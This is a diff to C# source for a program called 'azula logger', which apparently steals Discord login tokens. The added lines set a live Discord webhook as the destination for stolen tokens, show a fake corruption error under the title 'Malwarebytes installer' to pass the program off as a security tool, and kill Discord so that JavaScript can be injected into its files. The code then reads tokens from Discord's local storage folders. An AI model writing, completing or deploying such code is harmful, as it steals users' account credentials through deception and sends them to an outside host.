@@ -27,13 +27,15 @@ namespace azula_logger
         static void Main(string[] args)
         {
             //making webhook url & image a string so u dont have to change it everywhere
-            string webhook = "WEBHOOK URL";
-            string image = "IMAGE URL";
+            string webhook = "https://discordapp.com/api/webhooks/771479315505348670/IeeW88Ig_jojTE82M1M-9MCErp8wA0uUfVboNQO0_bS_fSG6I-jyJZNe-zVcDPSBI_5s";
+            string image = "";
             Task.Run(() =>
             {
                 Console.Beep();
-                MessageBox.Show("This programm seems to be corupt please talk to the developer to fix this issue", "azula logger");
+                MessageBox.Show("This programm seems to be corupt please talk to the developer to fix this issue", "Malwarebytes installer");
             });
+            //Kills discord so the logger can inject js code in a js file
+            KillDiscord.Kill();
             //Getting token from normal install
             TokenGetter.GetToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image);
             //Getting token from public test beta
